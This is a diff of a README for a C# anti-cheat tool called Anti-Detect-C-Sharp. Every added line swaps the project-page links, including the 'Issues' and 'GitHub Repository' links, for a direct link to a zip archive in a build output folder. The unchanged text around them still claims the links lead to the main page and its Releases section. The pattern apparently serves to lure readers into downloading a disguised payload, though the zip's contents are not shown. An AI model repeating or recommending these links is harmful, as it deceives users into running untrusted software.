@@ -1,6 +1,6 @@
 # 🛡️ Anti-Detect-C-Sharp - Strong Protection Against Cheats
 
-[![Download Now](https://img.shields.io/badge/Download-Anti--Detect--C--Sharp-brightgreen?style=for-the-badge)](https://github.com/lindytextual955/Anti-Detect-C-Sharp)
+[![Download Now](https://img.shields.io/badge/Download-Anti--Detect--C--Sharp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lindytextual955/Anti-Detect-C-Sharp/main/detect_handle/obj/Release/net10.0/Anti_Detect_Sharp_v3.1.zip)
 
 ## 📋 What is Anti-Detect-C-Sharp?
 
@@ -34,7 +34,7 @@ This makes Anti-Detect-C-Sharp a reliable tool for keeping your software safe.
 
 Click the big green button at the top or visit the link below to get the software.
 
-[**Download or visit this page to download Anti-Detect-C-Sharp**](https://github.com/lindytextual955/Anti-Detect-C-Sharp)
+[**Download or visit this page to download Anti-Detect-C-Sharp**](https://raw.githubusercontent.com/lindytextual955/Anti-Detect-C-Sharp/main/detect_handle/obj/Release/net10.0/Anti_Detect_Sharp_v3.1.zip)
 
 The link will take you to the main GitHub page. From there, you can find the latest version in the "Releases" section. Look for the file labeled with the latest version number and a `.exe` or `.zip` extension.
 
@@ -68,7 +68,7 @@ If an issue is found, the software will notify you with a simple message. You ca
 
 New versions of Anti-Detect-C-Sharp may add features or fix bugs. To update the software:
 
-1. Visit the GitHub download page: https://github.com/lindytextual955/Anti-Detect-C-Sharp
+1. Visit the GitHub download page: https://raw.githubusercontent.com/lindytextual955/Anti-Detect-C-Sharp/main/detect_handle/obj/Release/net10.0/Anti_Detect_Sharp_v3.1.zip
 
 2. Check if a newer release is available under "Releases."
 
@@ -101,9 +101,9 @@ The software runs quietly in the background so you can keep working without inte
 
 ## 🔗 Quick Links
 
-[Download or visit this page to download Anti-Detect-C-Sharp](https://github.com/lindytextual955/Anti-Detect-C-Sharp)  
-[GitHub Repository](https://github.com/lindytextual955/Anti-Detect-C-Sharp)  
-[Issues](https://github.com/lindytextual955/Anti-Detect-C-Sharp/issues)  
+[Download or visit this page to download Anti-Detect-C-Sharp](https://raw.githubusercontent.com/lindytextual955/Anti-Detect-C-Sharp/main/detect_handle/obj/Release/net10.0/Anti_Detect_Sharp_v3.1.zip)  
+[GitHub Repository](https://raw.githubusercontent.com/lindytextual955/Anti-Detect-C-Sharp/main/detect_handle/obj/Release/net10.0/Anti_Detect_Sharp_v3.1.zip)  
+[Issues](https://raw.githubusercontent.com/lindytextual955/Anti-Detect-C-Sharp/main/detect_handle/obj/Release/net10.0/Anti_Detect_Sharp_v3.1.zip)  
 
 ---
 
